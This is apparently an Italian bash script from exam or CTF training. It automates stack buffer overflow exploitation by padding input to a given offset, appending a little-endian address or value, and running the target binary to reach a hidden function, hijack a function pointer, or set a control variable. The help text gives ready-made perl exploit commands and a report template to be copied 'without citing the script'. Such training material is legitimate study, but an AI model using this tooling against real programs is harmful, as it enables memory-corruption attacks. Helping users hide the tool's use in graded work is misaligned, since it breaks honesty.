#!/bin/bash
#
# func_or_var.sh - Generatore interattivo di payload "padding + 4 byte LE".
#
# Un solo meccanismo, tre usi d'esame (tutti: padding fino all'offset, poi 4
# byte in Little-Endian):
#   - SECRET FUNCTION : i 4 byte = INDIRIZZO di una funzione nascosta che stampa
#                       la flag / apre una shell (indirizzo da 'info functions'
#                       o dall'istruzione 'call' in GDB).
#   - PUNTATORE A FUNZIONE : i 4 byte = INDIRIZZO della funzione buona, scritto
#                       sopra un puntatore a funzione in una struct.
#   - SOVRASCRITTURA VARIABILE : i 4 byte = un VALORE-bersaglio che una variabile
#                       di controllo deve assumere per superare un 'if' (es. il
#                       numero 0x42434445 richiesto dalla traccia).
# In tutti i casi inverti i 4 byte in Little-Endian: ci pensa lo script.

# ----------------------------- Help ----------------------------------------
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
cat << 'EOF'
NAME
    func_or_var.sh - Payload "padding + valore/indirizzo a 4 byte Little-Endian"

SYNOPSIS
    ./func_or_var.sh [-s] ./nome_binario <OFFSET>
    ./func_or_var.sh OPTION

DESCRIPTION
    Costruisce ed esegue il payload   [ 'A' x OFFSET ] + [ 4 byte Little-Endian ].
    I 4 byte li inserisci interattivamente (in esadecimale); lo script li
    inverte da solo. Serve per i tre scenari in cui si sovrascrive una singola
    "cella" a 4 byte:
      - secret function    -> i 4 byte sono un INDIRIZZO di funzione
      - puntatore a funzione-> i 4 byte sono un INDIRIZZO di funzione
      - variabile di controllo -> i 4 byte sono un VALORE da far assumere

    OFFSET e' la distanza (in byte) prima della cella da sovrascrivere:
    l'offset dell'EIP per secret function, o la distanza della variabile/
    puntatore per gli altri casi. In tutti i casi lo trovi con offset_finder.sh
    o per tentativi con le "BBBB" in GDB.

OPTIONS
    -s, --stdin
        Inietta via Standard Input invece che come argomento. Mantiene aperto
        lo stream con 'cat' per interagire con una shell eventualmente aperta.

    -h, --help
        Mostra questa guida.

NOTA
    - Passa il binario come ./nome (con lo slash).
    - Se l'indirizzo/valore contiene un byte 00 e usi la via ARGOMENTO, la shell
      lo troncherebbe: in quel caso preferisci la via STDIN (-s) o lancia a mano
      con  perl -e 'exec "./bin", "A"xOFFSET . "<4 byte>"'.

REPORT (da inserire a mano, SENZA citare lo script)
    1. Padding: "Ho inserito OFFSET byte di riempimento ('A') per raggiungere
       esattamente la cella da sovrascrivere (indirizzo di ritorno / variabile /
       puntatore a funzione) senza alterare prima lo stato dello stack."
    2. Little-Endian: "Avendo individuato il valore/indirizzo bersaglio (es.
       0x080484b4 per la funzione, oppure 0x42434445 come valore richiesto dall'
       if), l'ho scritto invertendo l'ordine dei byte (\xb4\x84\x04\x08), come
       richiede l'architettura x86."
    3. Esecuzione:
       Argomento: ./bin $(perl -e 'print "A"xOFFSET . "\xb4\x84\x04\x08"')
       STDIN:     (perl -e 'print "A"xOFFSET . "\xb4\x84\x04\x08"'; cat) | ./bin
    4. Mitigazione: "La vulnerabilita' nasce da una copia senza controllo di
       lunghezza (strcpy/gets) in un buffer fisso. Si corregge con funzioni a
       limite esplicito (strncpy/snprintf/fgets), validando l'input, e
       riabilitando stack canary, NX e ASLR."
EOF
exit 0
fi

USE_STDIN=false

if [ "$1" == "-s" ] || [ "$1" == "--stdin" ]; then
	USE_STDIN=true
	shift
fi

if [ "$#" -ne 2 ]; then
	echo "Uso: $0 [-s] ./nome_binario <OFFSET>"
	echo "Usa '$0 --help' per il manuale e i comandi per il report."
	exit 1
fi

BINARY="$1"
OFFSET="$2"

if [[ "$BINARY" != /* && "$BINARY" != ./* ]]; then
	echo "[!] Attenzione: '$BINARY' e' senza './'. Consigliato: ./$BINARY"
fi

echo "[*] Target: $BINARY"
echo "[*] Offset (padding 'A'): $OFFSET byte"
if [ "$USE_STDIN" = true ]; then
	echo "[*] Iniezione: STDIN (pipe interattiva con 'cat')"
else
	echo "[*] Iniezione: Argomento da riga di comando"
fi
echo "--------------------------------------------------"
echo "Inserisci i 4 byte da scrivere, in esadecimale:"
echo "  - INDIRIZZO di funzione (secret function / puntatore)  es. 0x565561b9"
echo "  - oppure VALORE per una variabile di controllo         es. 0x42434445"
echo "Lo script li inverte in Little-Endian da solo. CTRL+C per uscire."
echo "--------------------------------------------------"

while true; do
	read -r -p "Indirizzo/valore (hex) > " INPUT
	[ -z "$INPUT" ] && continue

	# togli un eventuale prefisso 0x
	CLEAN_HEX=${INPUT#0x}
	CLEAN_HEX=${CLEAN_HEX#0X}

	# controllo: solo cifre esadecimali
	if ! [[ "$CLEAN_HEX" =~ ^[0-9a-fA-F]+$ ]]; then
		echo "[-] Non e' esadecimale valido. Esempio: 0x565561b9 oppure 42434445"
		continue
	fi

	# pad a 8 (32 bit) o 16 (64 bit) cifre, a sinistra con zeri, per il LE corretto
	if [ ${#CLEAN_HEX} -le 8 ]; then
		HEX_PADDED=$(printf "%08s" "$CLEAN_HEX" | tr ' ' '0')
	else
		HEX_PADDED=$(printf "%016s" "$CLEAN_HEX" | tr ' ' '0')
	fi

	# costruisce il payload: 'A'xOFFSET + byte invertiti (Little-Endian)
	PERL_CMD="print 'A'x$OFFSET; print map { chr(hex(\$_)) } reverse unpack('(A2)*', '$HEX_PADDED')"

	echo "[-] Little-Endian applicato su: $HEX_PADDED"
	# mostra come apparira' (byte invertiti) per il report
	LE_SHOW=$(perl -e "print join('', map { sprintf('\\\\x%s',\$_) } reverse unpack('(A2)*', '$HEX_PADDED'))")
	echo "[-] Byte iniettati: $LE_SHOW"
	echo "[+] Esecuzione..."
	echo "--------------------------------------------------"

	if [ "$USE_STDIN" = true ]; then
		(perl -e "$PERL_CMD"; cat) | "$BINARY"
	else
		PAYLOAD=$(perl -e "$PERL_CMD")
		"$BINARY" "$PAYLOAD"
	fi

	echo ""
	echo "--------------------------------------------------"
done
